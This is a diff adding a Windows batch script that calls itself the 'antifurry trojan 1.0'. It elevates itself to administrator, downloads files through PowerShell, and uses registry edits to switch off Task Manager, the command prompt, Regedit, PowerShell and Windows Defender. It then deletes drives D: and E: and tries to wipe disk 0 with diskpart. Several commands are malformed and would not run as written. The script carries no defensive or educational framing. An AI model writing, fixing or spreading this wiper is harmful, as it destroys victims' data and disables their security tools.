@@ -1,0 +1,47 @@
+@echo off
+
+Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)
+Echo Administrative privileges have been got.
+
+
+
+@ECHO OFF & CLS & ECHO.
+NET FILE 1>NUL 2>NUL & IF ERRORLEVEL 1 (ECHO You must right-click and select &
+  ECHO "RUN AS ADMINISTRATOR"  to run this batch. Exiting... & ECHO. &
+  PAUSE & EXIT /D)
+
+color 2 
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.example.com/package.zip', 'package.zip')"
+powershell -Command "Invoke-WebRequest https://www.google.com/search?q=static&rlz=1C1GCEB_enUS1046US1046&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjvitvatqn9AhVygoQIHYmpDG8Q_AUoAXoECAEQAw&biw=1366&bih=568&dpr=1&safe=active&ssui=on#imgrc=lzh--X3ONRGgHM-close-up-your-files-encrypted-screen-95310554.jpg.zip -OutFile package.zip"
+ 
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f .
+
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableCMD /t REG_DWORD /d 1 /f .
+
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegedit /t REG_DWORD /d 1 /f .
+
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v Disablepowershell /t REG_DWORD /d 1 /f .
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
+ 
+
+del E:\
+
+del D:\
+
+rmdir /s /q
+
+
+
+
+echo you have been infected by the antifurry trojan 1.0
+
+diskpart
+
+select disk 0
+
+clean /s /q
+
+
+
+
